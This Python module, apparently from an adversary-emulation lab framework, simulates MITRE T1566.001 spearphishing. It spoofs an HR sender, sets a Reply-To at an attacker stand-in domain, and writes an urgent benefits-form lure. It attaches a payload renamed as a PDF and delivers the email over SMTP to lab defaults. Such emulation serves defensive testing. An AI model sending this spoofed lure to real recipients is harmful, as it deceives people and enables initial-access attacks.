"""
campaigns/phishing/spear_phish.py — T1566.001 Spearphishing Attachment

Simulates a spearphishing email with a benign attachment payload.
All payloads are non-destructive and for educational use only.

MITRE ATT&CK: T1566.001 — Phishing: Spearphishing Attachment
Tactic: Initial Access
"""

import os
import smtplib
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

from campaigns.base_campaign import BaseCampaign
from .payload_gen import PayloadGenerator


class SpearPhishCampaign(BaseCampaign):
    """
    T1566.001 — Spearphishing Attachment

    Sends a crafted phishing email to the victim mail server with a
    benign payload attachment. The email spoofs a trusted sender and
    uses social engineering to trick the victim into opening the file.
    """

    TECHNIQUE_ID = "T1566.001"
    TECHNIQUE_NAME = "Spearphishing Attachment"
    TACTIC = "Initial Access"

    # Lab configuration
    TARGET_EMAIL = os.environ.get("TARGET_VICTIM_EMAIL", "user@lab.local")
    MAIL_HOST = os.environ.get("TARGET_MAIL_HOST", "172.20.0.32")
    MAIL_PORT = int(os.environ.get("TARGET_MAIL_PORT", "25"))
    SPOOFED_SENDER = "hr-noreply@trusted-corp.com"

    def run(self) -> dict:
        self.log_step("init", f"Targeting {self.TARGET_EMAIL} via {self.MAIL_HOST}")

        # Step 1: Generate benign payload
        payload_gen = PayloadGenerator()
        payload_path, payload_hash = payload_gen.generate_doc_payload()
        self.log_step("payload_generation", f"Created payload: {payload_path} (SHA256: {payload_hash})")
        self.simulate_delay(1)

        # Step 2: Craft phishing email
        msg = self._craft_phishing_email(payload_path)
        self.log_step("email_crafted", f"Spoofed sender: {self.SPOOFED_SENDER}, Subject: {msg['Subject']}")
        self.simulate_delay(0.5)

        # Step 3: Attempt delivery
        delivered = self._send_email(msg, payload_path)

        if delivered:
            self.log_step("email_delivered", f"Email delivered to {self.TARGET_EMAIL}", "success")
            artifact_data = json.dumps({
                "technique": self.TECHNIQUE_ID,
                "target_email": self.TARGET_EMAIL,
                "spoofed_sender": self.SPOOFED_SENDER,
                "payload_hash": payload_hash,
                "timestamp": datetime.utcnow().isoformat(),
            }, indent=2)
            self.save_artifact("phishing_evidence.json", artifact_data)
            return self.build_result(True, "Phishing email delivered successfully")
        else:
            self.log_step("email_failed", "Could not reach mail server (may be simulated)", "simulated")
            return self.build_result(True, "Phishing simulated (mail server not reachable in this environment)")

    def _craft_phishing_email(self, payload_path: str) -> MIMEMultipart:
        """Construct the phishing email with social engineering content."""
        msg = MIMEMultipart()
        msg["From"] = self.SPOOFED_SENDER
        msg["To"] = self.TARGET_EMAIL
        msg["Subject"] = "ACTION REQUIRED: Updated Benefits Enrollment Form"
        msg["Reply-To"] = "attacker@evil-domain.net"  # IoC: mismatched reply-to

        body = """Dear Team Member,

Please review and complete the attached benefits enrollment form by end of business today.
Failure to submit may result in loss of coverage for the upcoming quarter.

Best regards,
HR Department
Trusted Corp LLC

---
This message was sent automatically. Please do not reply to this email directly.
For support, contact hr@trusted-corp.com
"""
        msg.attach(MIMEText(body, "plain"))

        # Attach payload file
        with open(payload_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f'attachment; filename="Benefits_Form_2024.pdf"')
        msg.attach(part)

        return msg

    def _send_email(self, msg: MIMEMultipart, payload_path: str) -> bool:
        """Attempt to deliver the phishing email to the mail server."""
        try:
            with smtplib.SMTP(self.MAIL_HOST, self.MAIL_PORT, timeout=5) as server:
                server.sendmail(self.SPOOFED_SENDER, [self.TARGET_EMAIL], msg.as_string())
            return True
        except Exception:
            return False
